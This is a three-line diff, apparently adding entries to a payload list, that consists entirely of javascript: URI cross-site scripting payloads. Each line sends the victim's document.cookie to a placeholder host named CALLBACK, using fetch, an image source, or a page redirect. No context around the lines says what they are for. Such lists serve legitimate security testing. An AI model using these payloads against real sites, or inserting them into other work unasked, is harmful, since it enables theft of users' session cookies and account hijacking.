@@ -1,0 +1,3 @@
+javascript:fetch('https://CALLBACK/?c='+document.cookie)
+javascript:new Image().src='https://CALLBACK/?c='+document.cookie
+javascript:location='https://CALLBACK/?c='+document.cookie
